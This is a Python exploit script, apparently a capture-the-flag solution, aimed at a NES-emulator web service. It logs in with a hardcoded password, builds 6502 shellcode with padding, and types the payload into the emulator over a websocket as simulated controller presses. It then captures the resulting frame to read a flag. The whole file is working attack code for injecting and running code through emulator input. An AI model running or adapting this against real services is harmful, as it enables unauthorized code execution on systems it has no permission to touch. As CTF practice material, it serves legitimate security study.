import asyncio
import requests
import websockets

from PIL import Image
import gzip

url = "localhost:8080"
delay = 0.03

actix_session = requests.post("http://" + url + "/api/login", json={"password":"nwTdWyK4uXmzU9HkVwEDVhhe3ENCgkfa"}).cookies['actix-session']

shellcode = b"\x00\x00\xa9\x90\x8d\x00\x20\xa9\x20\x8d\x06\x20\xa9\x00\x8d\x06\x20\xa9\x00\xa2\x00\xa0\x00\x8a\x80\x8d\x07\x20\xe8\xe0\x40\xd0\xf6\xa9\x00\xc9\x00\xf0\xfa"

payload = b"\x00\x00"  # The first one gets overwritten by 0xC0 and the second one is taken as an argument to cpy 
payload += shellcode
payload += b'\x00' * (0x100 - len(payload)) + b"\x02"
payload += b'\x00' * (0x1ff - len(payload))

print(hex(len(payload)))

ready = False

async def nestadiaWs():
    async def consumer_handler(websocket):
        async for message in websocket:
            with open('flag.raw', 'wb') as f:
                f.write(message)

    async def producer_handler(websocket):
        for i in payload:
            for j in range(0, i):
                # Press and release A
                controller = 0x80
                await asyncio.sleep(delay)
                await websocket.send(bytes([controller]))
                controller = 0x00
                await asyncio.sleep(delay)
                await websocket.send(bytes([controller]))
            # Press and release B
            controller = 0x40
            await asyncio.sleep(delay)
            await websocket.send(bytes([controller]))
            controller = 0x00;
            await asyncio.sleep(delay)
            await websocket.send(bytes([controller]))

        # Press and release Start
        controller = 0x10
        await asyncio.sleep(delay)
        await websocket.send(bytes([controller]))
        controller = 0x00
        await asyncio.sleep(delay)
        await websocket.send(bytes([controller]))

        await asyncio.sleep(5)
        await asyncio.sleep(15)

    async with websockets.connect("ws://" + url + "/api/dev/emulator", extra_headers=[('Cookie', 'actix-session=' + actix_session)]) as websocket:
        consumer_task = asyncio.ensure_future(consumer_handler(websocket))
        producer_task = asyncio.ensure_future(producer_handler(websocket))
        done, pending = await asyncio.wait([consumer_task, producer_task],return_when=asyncio.FIRST_COMPLETED,        )
        for task in pending:
            task.cancel()

RGB_VALUE_TABLE = [
    [0x7C, 0x7C, 0x7C],
    [0x00, 0x00, 0xFC],
    [0x00, 0x00, 0xBC],
    [0x44, 0x28, 0xBC],
    [0x94, 0x00, 0x84],
    [0xA8, 0x00, 0x20],
    [0xA8, 0x10, 0x00],
    [0x88, 0x14, 0x00],
    [0x50, 0x30, 0x00],
    [0x00, 0x78, 0x00],
    [0x00, 0x68, 0x00],
    [0x00, 0x58, 0x00],
    [0x00, 0x40, 0x58],
    [0x00, 0x00, 0x00],
    [0x00, 0x00, 0x00],
    [0x00, 0x00, 0x00],
    [0xBC, 0xBC, 0xBC],
    [0x00, 0x78, 0xF8],
    [0x00, 0x58, 0xF8],
    [0x68, 0x44, 0xFC],
    [0xD8, 0x00, 0xCC],
    [0xE4, 0x00, 0x58],
    [0xF8, 0x38, 0x00],
    [0xE4, 0x5C, 0x10],
    [0xAC, 0x7C, 0x00],
    [0x00, 0xB8, 0x00],
    [0x00, 0xA8, 0x00],
    [0x00, 0xA8, 0x44],
    [0x00, 0x88, 0x88],
    [0x00, 0x00, 0x00],
    [0x00, 0x00, 0x00],
    [0x00, 0x00, 0x00],
    [0xF8, 0xF8, 0xF8],
    [0x3C, 0xBC, 0xFC],
    [0x68, 0x88, 0xFC],
    [0x98, 0x78, 0xF8],
    [0xF8, 0x78, 0xF8],
    [0xF8, 0x58, 0x98],
    [0xF8, 0x78, 0x58],
    [0xFC, 0xA0, 0x44],
    [0xF8, 0xB8, 0x00],
    [0xB8, 0xF8, 0x18],
    [0x58, 0xD8, 0x54],
    [0x58, 0xF8, 0x98],
    [0x00, 0xE8, 0xD8],
    [0x78, 0x78, 0x78],
    [0x00, 0x00, 0x00],
    [0x00, 0x00, 0x00],
    [0xFC, 0xFC, 0xFC],
    [0xA4, 0xE4, 0xFC],
    [0xB8, 0xB8, 0xF8],
    [0xD8, 0xB8, 0xF8],
    [0xF8, 0xB8, 0xF8],
    [0xF8, 0xA4, 0xC0],
    [0xF0, 0xD0, 0xB0],
    [0xFC, 0xE0, 0xA8],
    [0xF8, 0xD8, 0x78],
    [0xD8, 0xF8, 0x78],
    [0xB8, 0xF8, 0xB8],
    [0xB8, 0xF8, 0xD8],
    [0x00, 0xFC, 0xFC],
    [0xF8, 0xD8, 0xF8],
    [0x00, 0x00, 0x00],
    [0x00, 0x00, 0x00],
]

def show_frame(raw):
    raw = gzip.decompress(raw)
    image_data = b""
    for b in raw:
        image_data = image_data + bytes(RGB_VALUE_TABLE[b]) + b"\xff"
    image = Image.frombytes('RGBA', (256, 240), image_data, 'raw')
    image.show()


asyncio.get_event_loop().run_until_complete(nestadiaWs())

with open("flag.raw", "rb") as f:
    show_frame(f.read())